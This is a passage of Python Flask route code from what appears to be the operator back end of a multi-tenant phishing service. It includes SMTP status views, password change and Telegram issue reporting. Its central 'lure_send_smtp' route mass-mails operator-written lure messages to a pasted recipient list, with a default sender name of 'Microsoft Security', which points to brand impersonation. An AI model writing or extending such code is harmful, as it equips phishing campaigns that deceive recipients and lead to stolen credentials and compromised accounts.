        return jsonify({'status': 'success', 'message': f'Test email sent to {test_email}'})
    else:
        return jsonify({'status': 'error', 'message': f'Test failed: {msg}'}), 400

@operator_bp.route('/admin/smtp/<int:user_id>/status')
@login_required
@operator_required
def admin_smtp_status(user_id):
    """Allow admin to see SMTP status of any user."""
    if current_user.role != 'admin':
        return jsonify({'error': 'Admin access required'}), 403

    user = User.query.get_or_404(user_id)
    return jsonify({
        'enabled': user.smtp_enabled,
        'server': user.smtp_server,
        'port': user.smtp_port,
        'username': user.smtp_username,
        'from_email': user.smtp_from_email,
        'from_name': user.smtp_from_name,
        'use_tls': user.smtp_use_tls,
        'has_password': bool(user.smtp_password)
    })

# ============================================================
# LURE SEND VIA SMTP (uses user SMTP)
# ============================================================
@operator_bp.route('/lure_send_smtp', methods=['POST'])
@login_required
@operator_required
def lure_send_smtp():
    data = request.get_json()
    subject = data.get('subject')
    body = data.get('body')
    recipients_raw = data.get('recipients', '')
    recipients = [r.strip() for r in recipients_raw.split('\n') if r.strip()]

    if not recipients:
        return jsonify({'error': 'No recipients provided'}), 400

    user = current_user

    if user.smtp_enabled and user.smtp_server:
        server = user.smtp_server
        port = user.smtp_port
        username = user.smtp_username
        password = decrypt_text(user.smtp_password) if user.smtp_password else None
        from_email = user.smtp_from_email
        from_name = user.smtp_from_name
        use_tls = user.smtp_use_tls
    else:
        server = current_app.config.get('SMTP_SERVER')
        port = current_app.config.get('SMTP_PORT', 587)
        username = current_app.config.get('SMTP_USERNAME')
        password = current_app.config.get('SMTP_PASSWORD')
        from_email = current_app.config.get('SMTP_FROM_EMAIL')
        from_name = current_app.config.get('SMTP_FROM_NAME', 'Microsoft Security')
        use_tls = current_app.config.get('SMTP_USE_TLS', True)

    success, msg, sent, failed = send_email_smtp(
        recipients, subject, body,
        from_email=from_email, from_name=from_name,
        server=server, port=port, username=username, password=password, use_tls=use_tls
    )

    if success:
        return jsonify({'sent': sent, 'failed': failed, 'total': len(recipients)})
    else:
        return jsonify({'sent': 0, 'failed': recipients, 'total': len(recipients), 'error': msg}), 500

# ============================================================
# CHANGE PASSWORD (already in auth blueprint, but keep if needed)
# ============================================================
@operator_bp.route('/change_password', methods=['POST'])
@login_required
@operator_required
def change_password():
    data = request.get_json()
    if not data:
        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

    current = data.get('current_password', '').strip()
    new = data.get('new_password', '').strip()
    confirm = data.get('confirm_password', '').strip()

    if not current or not new or not confirm:
        return jsonify({'status': 'error', 'message': 'All fields are required.'}), 400

    if new != confirm:
        return jsonify({'status': 'error', 'message': 'New passwords do not match.'}), 400

    if len(new) < 8:
        return jsonify({'status': 'error', 'message': 'Password must be at least 8 characters.'}), 400

    user = current_user
    if not user.check_password(current):
        return jsonify({'status': 'error', 'message': 'Current password is incorrect.'}), 400

    user.set_password(new)
    db.session.commit()

    return jsonify({'status': 'success', 'message': 'Password changed successfully.'})

# ============================================================
# REPORT ISSUE (sends to tenant Telegram)
# ============================================================
@operator_bp.route('/report', methods=['POST'])
@login_required
@operator_required
def report_issue():
    data = request.get_json()
    if not data:
        return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400

    subject = data.get('subject', '').strip()
    message = data.get('message', '').strip()

    if not subject or not message:
        return jsonify({'status': 'error', 'message': 'Subject and message are required.'}), 400

    tenant = current_user.tenant
    if not tenant:
        return jsonify({'status': 'error', 'message': 'No tenant associated with your account.'}), 400

    bot_token = tenant.telegram_bot_token
    chat_id = tenant.telegram_chat_id

    if not bot_token or not chat_id:
        return jsonify({'status': 'error', 'message': 'Telegram is not configured for this tenant. Please contact your admin.'}), 400

    report_text = (
        f"📋 **New Report from @{current_user.username}**\n\n"
        f"**Subject:** {subject}\n\n"
        f"**Message:**\n{message}\n\n"
        f"— from {current_user.email or current_user.username} (User ID: {current_user.id})"
    )

    success = send_telegram(bot_token, chat_id, report_text)

    if success:
        return jsonify({'status': 'success', 'message': 'Report sent successfully. The admin will review it shortly.'})
    else:
        return jsonify({'status': 'error', 'message': 'Failed to send Telegram message. Please try again later.'}), 500